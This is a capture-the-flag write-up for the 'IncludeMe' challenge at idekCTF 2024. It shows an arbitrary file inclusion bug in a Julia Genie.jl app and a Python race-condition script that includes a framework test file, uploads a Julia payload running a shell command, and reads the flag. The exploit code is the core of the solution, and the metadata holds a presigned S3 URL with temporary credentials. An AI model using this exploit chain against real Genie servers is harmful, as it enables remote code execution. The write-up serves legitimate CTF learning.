---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466XDABIIOH%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T210326Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIQDFx8KawQ2Sr7H8QMnBiFAiTTk%2BEcbaIeaWrWgIe2SM8gIgSLYXS75DjklL2WGKOdszTVECzaedn1LO0m3%2BEhf6rOQqiAQI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKpFobV9LZ%2Fnc3%2F4TCrcAzCBEeMD4C9kSPf7uf2enf2gha3ZI2YiUYCM0jJlMdxHxRIrodUsTrymwmPwDYzwJAxkZor4GiLAqhG0e3Q5ie6J33QivzLWp7PFj0u0RnkRAcRNbEMpxF5SdgKg0Qn7X6cq87LNqCw78VgpdSGUFvNoeo3U0yU8HB3rX5lTR5LPJ1MW2dU3BHAY3zeV9V8B0zQECmhdzepXGlu9nW6C6SM5ueGM3XTL19SSdP5rF66AX4t%2B0iRK4MSErypz%2FE%2FsbiTALPnZ049r%2Ba%2ByfDsgOJfWIlznACdQHnviBsI%2FloLb11rmjxrpf66413ipNl%2BrJFJUU0vdB05sYMHmrfBuxWu8GJaUXGC9veQMoCEosN9yDXrjRTQEOsXcE2EwicmOehAvAWKcMl5i3pHzdGO%2Fb2vm6enAeWy7nlXEowFvGCQya5Bqw8G6sh0eIMSHxk0n1AR6PzkOaYc%2FaxN8n9Ro3a6IbPR1JWRb%2FuDc1tr6j4ty%2BdZwk8Jr7oWjiLKRdIIb90bQ75TeMNYhBhq2SufL7G2l31FJ8g6%2FDJQZ%2Bzffc6hCvT%2BI9OGfcEXh%2BxsXhuyKd3TyRiINC3nnqZ1YHqBxK5K%2B472lP%2B3q55NcO%2BVQCLk9My3ufQPxnVBkcViiMNK9w8EGOqUBuHqOLrr3Wd9BbDaNTv1TteLFrWWyoe0ZQKW9U%2BOr3ztAy12MU2rOL70A7QLLNU2UOyPbvH6F9KsV8R3oLTZKaKqXz1i0h2p67wc59EHcP7bHjIpTSe9r50%2B%2F8Ux7YlBeuxZarbHsPTKfGqHzJ4EVBd14%2BOVOrWJIGk6rMqWKqPWoQA0ekHfaDdSRuYr1QuPzC2aUMMFREMyZDVWBQzhVAYC4XMWk\&X-Amz-Signature=402ac170be4071b8a005df4eb857cc2e09ac0140d0cb160dbd80d70352ef6b03\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
